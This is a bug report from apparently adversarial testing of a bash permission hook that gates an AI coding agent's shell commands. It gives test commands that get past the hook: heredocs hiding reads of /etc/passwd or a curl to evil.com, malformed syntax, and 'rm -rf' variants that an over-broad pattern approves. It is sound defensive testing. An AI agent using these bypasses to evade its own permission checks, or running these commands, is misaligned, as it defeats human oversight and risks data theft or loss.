# BUGZ

Confirmed bugs found via adversarial CLI testing
(`uv run lovely-devin-permissions -t '<cmd>'`, plus hook-stdin where noted).

Severity: 🔴 critical security / severe functional · 🟠 high · 🟡 medium · ⚪ low.

Status legend for CLI output:

- `approve` (💚) → allow
- `ask` (💛 REQUIRES-USER-APPROVAL, no `decision` key) → ask
- `block` (❤️ auto-rejected, `decision: block`) → deny

Config under test: `~/.config/devin/lovely-permissions.jsonc` (default wildcard
`"*": "ask"`; `subshell`/`variable_assignment`/`input_redirection` allow;
`blocked_paths_regex` = `\/etc`, `\.env$`, `\.envrc$`).

---

## 1. 🔴 Heredoc bodies bypass every security check

**Area:** `src/lovely_bash_permissions/rules.py` (redirection target handling),
`evaluate.py` (subshell/blocked-path passes), `segments.py`

shfmt exposes heredoc bodies in `Redir.Hdoc.Parts`, but the code reads only
`Redir.Word` (the delimiter) and never recurses into `Hdoc`. Bash executes
`$(...)`, backticks, and `$(<file)` inside **unquoted** heredocs at runtime, so
dangerous content is invisible to blocked-path, allowed-command, and subshell
checks.

```bash
# blocked-path bypass — reads /etc/passwd, auto-approved
uv run lovely-devin-permissions -t $'wc -l <<EOF\n$(cat /etc/passwd)\nEOF'
# → approve

# bash file-read bypass into same blocked file
uv run lovely-devin-permissions -t $'wc -l <<EOF\n$(</etc/passwd)\nEOF'
# → approve

# arbitrary command smuggling (curl to exfil endpoint)
uv run lovely-devin-permissions -t $'wc -l <<EOF\n$(curl -s http://evil.com/x)\nEOF'
# → approve

# backtick variant
uv run lovely-devin-permissions -t $'wc -l <<EOF\n`cat /etc/passwd`\nEOF'
# → approve

# control: the here-string equivalents ARE correctly denied
uv run lovely-devin-permissions -t 'wc -l <<< "$(cat /etc/passwd)"'
# → block
```

**Impact:** any allow-listed command that reads stdin (`wc`, `grep`, `head`,
`tail`, `sort`, `rg`, `cat`, `echo`, ...) becomes a sandbox escape for reading
blocked files or executing arbitrary commands. Defeats `blocked_paths_regex`
entirely.

---

## 2. 🔴 ParseError falls back to `*` wildcard, bypassing all checks

**Area:** `src/lovely_bash_permissions/evaluate.py:205-212`

`evaluate_bash_command` returns `{"status": _wildcard}` immediately when
`parse()` raises (shfmt fails), before allowed-pattern / blocked-path /
redirection / background checks run.

```bash
# even with default *:ask, a blocked path is downgraded deny → ask
uv run lovely-devin-permissions -t 'cat /etc/passwd'        # → block
uv run lovely-devin-permissions -t "cat /etc/passwd '"      # → ask (ParseError path!)
```

With `"*": "allow"` in config, **any** malformed bash is auto-approved with no
content inspection at all:

```bash
uv run lovely-devin-permissions -t '(((invalid'     # ParseError + *:allow → allow
uv run lovely-devin-permissions -t '; ; ;'          # ParseError + *:allow → allow
uv run lovely-devin-permissions -t 'echo "unclosed' # ParseError + *:allow → allow
```

**Impact:** any syntax shfmt rejects but real bash accepts silently disables
the permission layer. Under `*: allow` it is a hard bypass; under default
`*: ask` it downgrades hard blocks to soft asks (an auto-accepting agent
runs them).

---

## 3. 🔴 `_item_to_anchored_pattern` matches only the first word

**Area:** `src/lovely_bash_permissions/rules.py:38-40` (fed by
`config/effective_bash.py:36` for `allow` and `:51` for `deny`)

Items containing spaces are split at the first token and the argument tail is
swallowed by `(\s.*)?$` — the full command is never matched:

```python
if " " in item:
    cmd = item.split(" ", 1)[0]
    return f"^{re.escape(cmd)}(\\s.*)?$"
```

**Repro (allow direction — a user who narrowly allowlists one destructive
command grants carte blanche for that command name).** Config
`allow: ["rm -rf /"]` produces `^rm(\s.*)?$`, so all of these auto-approve:

```bash
uv run lovely-devin-permissions -t 'rm -rf /'
uv run lovely-devin-permissions -t 'rm -rf /etc'
uv run lovely-devin-permissions -t 'rm -rf ~'
uv run lovely-devin-permissions -t 'rm file.txt'
# all → approve
```

**Repro (deny direction — over-broad but safe).** `deny: ["cat /etc/passwd"]`
→ `^cat(\s.*)?$` blocks **all** `cat`, not just `/etc/passwd`. The args are
never part of the match, contradicting the docstring.

**Impact:** precise allow/deny rules are impossible; `allow` items silently
over-grant, `deny` items over-block.

---

## 4. 🔴 Hook label regex is dead code → every rewritten command re-asks

**Area:** `src/lovely_bash_permissions/evaluate.py:92-116`
(`_strip_quotes`/`_command_string`) vs `config/effective_bash.py:14`
(`HOOK_LABEL_REGEX = ^: '\[♡ perms:(\s|$)`), `hook.py:34` (`_hook_command`)

`_command_string` strips quotes from arguments before matching
(`_strip_quotes(''[♡ perms: x]'') →`[♡ perms: x]`), so the command string
becomes`: [♡ perms: x]` — which never matches the always-appended
`^: '\[♡ perms:(\s|$)` label regex. The hook label is never recognized.

**Repro — production flow.** An approved command is rewritten by the hook into
`: '<label>' 💚 ; <cmd>`, and Devin re-evaluates that rewritten command:

```bash
uv run lovely-devin-permissions -t 'echo hi'
# → approve, rewritten to:
#   : '[♡ perms: 💚 auto-approved] command matches allowed pattern: ^echo(\s+.*)?$' 💚 ; echo hi

# feeding that rewritten command back (what Devin does) yields ASK, not approve:
uv run lovely-devin-permissions -t ": '[\u2661 perms: \U0001F49A auto-approved] command matches allowed pattern: ^echo(\\s+.*)?\$' \U0001F49A ; echo hi"
# → ask
```

**Impact:** every auto-approved command re-evaluates as "requires user
approval" after the hook's rewrite. In an auto-accepting agent this surfaces
spurious approval prompts and can stall automation; the label mechanism
intended to prevent exactly this is inert.

---

## 5. 🟠 Mismatched-quote corruption in `_item_to_anchored_pattern`

**Area:** `src/lovely_bash_permissions/rules.py:31-35`

A leading quote unconditionally strips the last character too:

```python
if item.startswith(("'", '"')):
    item = item[1:-1]
if item.endswith(("'", '"')):
    item = item[:-1]
```

**Repro (config items):**

```python
# in-process behaviour of _item_to_anchored_pattern:
"rm"  -> "^r$"          # 'rm' -> ^r$  too — near-useless pattern
'"git push' -> "^git(\\s.*)?$"   # trailing "h" silently dropped
'""'        -> "^$"              # matches EVERYTHING
```

Only well-matched leading+trailing quotes (`"rm -rf /"`) survive intact.

**Impact:** typo'd/quoted items silently produce broken or wildly over-broad
patterns. `^$` matching everything can auto-approve any command if used in an
allow item.

---

## 6. 🟠 `python3 -m json.tool` allowlist pattern missing trailing anchor

**Area:** `~/.config/devin/lovely-permissions.jsonc` line 46
(`allowed_cmds_regex`), no `$` on `^python3\s+-m\s+json.tool`

```bash
uv run lovely-devin-permissions -t 'python3 -m json.toolx --whatever'
# → approve   (typo'd module name auto-approved)

uv run lovely-devin-permissions -t 'python3 -m json.tool --bogus-flag'
# → approve   (any extra arg auto-approved)
```

Neighboring patterns (`^ls(\s+.*)?$`, `^which\s+.+$`) are properly anchored.

**Impact:** allows arbitrary args / extension to `python3 -m json.tool`
without approval.

---

## 7. 🟠 Blocked-path `\.env$` misses common secret variants

**Area:** `~/.config/devin/lovely-permissions.jsonc` line 12
(`blocked_paths_regex` = `\/etc`, `\.env$`, `\.envrc$`)

```bash
uv run lovely-devin-permissions -t 'cat .env'            # → block
uv run lovely-devin-permissions -t 'cat .envrc'          # → block
uv run lovely-devin-permissions -t 'cat .env.production' # → approve  (BUG)
uv run lovely-devin-permissions -t 'cat .env.local'      # → approve  (BUG)
uv run lovely-devin-permissions -t 'cat .env.development'# → approve  (BUG)
```

**Impact:** common secret-file variants slide through and are readable via the
allow-listed `cat`/`head`/`tail`/`grep`.

---

## 8. 🟡 Duplicated "Blocked by bash permissions" reason messages

**Area:** `src/lovely_bash_permissions/evaluate.py` — segment loop plus
subshell-contents loop, no de-dup

The same blocked-path message is appended once per pass:

```bash
uv run lovely-devin-permissions -t 'echo $(cat /etc/passwd)'
# → block, reason repeats the /etc/passwd message ×2

uv run lovely-devin-permissions -t 'export FOO=$(cat /etc/passwd)'
# → block, reason repeats the /etc/passwd message ×3

uv run lovely-devin-permissions -t 'echo $(echo $(echo $(cat /etc/passwd)))'
# → block, duplicated ×2
```

**Impact:** cosmetic — noisy `reason` for agents parsing hook output.

---

## 10. ⚪ Parameter expansions inside double quotes dropped → false "ask"

**Area:** `src/lovely_bash_permissions/inspect.py` (`_word_raw`/`_word_value`
emit only `DblQuoted.value`, never descend into nested ParamExp/CmdSubst)

```bash
uv run lovely-devin-permissions -t 'cat "$f"'       # → ask (BUG, should approve)
uv run lovely-devin-permissions -t 'grep "$HOME"'   # → ask (BUG)
uv run lovely-devin-permissions -t 'echo "$USER"'   # → ask (BUG)
```

Segment args come out as `['""']`, so `^cat\s+.+$` etc. never match. Nested
`"$(cat /etc/passwd)"` is still caught by the separate subshell-content pass
(→ block), so this is over-ask, not a bypass.

**Impact:** false approval prompts for allow-listed commands whose only
argument is a double-quoted expansion.

---

## Summary

| # | Severity | Bug | Fix area |
| --- | ---------- | ----- | ---------- |
| 1 | 🔴 | Heredoc bodies (`<<EOF`) invisible to checks — blocked-path / command-substitution bypass | inspect/scan `Redir.Hdoc.Parts` |
| 2 | 🔴 | ParseError → `*` wildcard; downgrades deny→ask, auto-approves under `*: allow` | `evaluate.py` ParseError branch |
| 3 | 🔴 | `_item_to_anchored_pattern` matches first word only → narrow allow/deny rules over-grant/over-block | `rules.py` |
| 4 | 🔴 | Hook label regex dead — every rewritten command re-asks in production | quote-stripping vs label regex |
| 5 | 🟠 | Mismatched-quote corruption (`"rm`→`^r$`, `'""'`→`^$`) | `rules.py` quote handling |
| 6 | 🟠 | `python3 -m json.tool` missing trailing `$` | default config line 46 |
| 7 | 🟠 | `\.env$` misses `.env.production`/`.env.local` variants | default config line 12 |
| 8 | 🟡 | Duplicated blocked-path reason messages | `evaluate.py` de-dup |
| 10 | ⚪ | `cat "$f"` false "ask" (ParamExp dropped from args) | `inspect.py` |
